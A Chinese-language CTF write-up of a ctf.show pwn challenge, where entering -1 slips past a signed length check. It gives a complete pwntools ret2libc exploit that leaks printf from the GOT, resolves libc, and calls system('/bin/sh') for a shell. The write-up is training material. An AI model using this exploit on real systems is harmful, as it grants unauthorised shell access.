# 挑战简介
类型转换

# 思路
ret2libc 的基础题，不过加了些整形转换  

<img width="479" height="213" alt="image" src="https://github.com/user-attachments/assets/f610148c-3e51-4953-a739-9545e0dc53dd" />

检测中的需求数字大小不能大于32，所以你填入-1，由于无符号，所以直接就越过了标准大小32  

<img width="432" height="41" alt="image" src="https://github.com/user-attachments/assets/83716b1f-e8a2-4322-a314-c10833aafa42" />

后面就是简单的ret2libc了  

```
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28302)

elf = ELF('./pwn')

main = elf.symbols['main']

printf_got = elf.got['printf']
printf_plt = elf.plt['printf']

io.recvuntil('read?')

io.sendline('-1')

io.recvuntil('\n')

payload = b'a' * (0x2c + 0x4) + p32(printf_plt) + p32(main) + p32(printf_got)

io.sendline(payload)
io.recvuntil('\n')

printf_ = u32(io.recv(4))
print(hex(printf_))

libc = LibcSearcher('printf', printf_)

libc_base = printf_ - libc.dump('printf')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')


io.recvuntil('read?')
io.sendline('-1')
io.recvuntil('\n')

payload = b'a' * (0x2c + 0x4) + p32(system) + p32(main) + p32(bin_sh)

io.sendline(payload)

io.interactive()
```
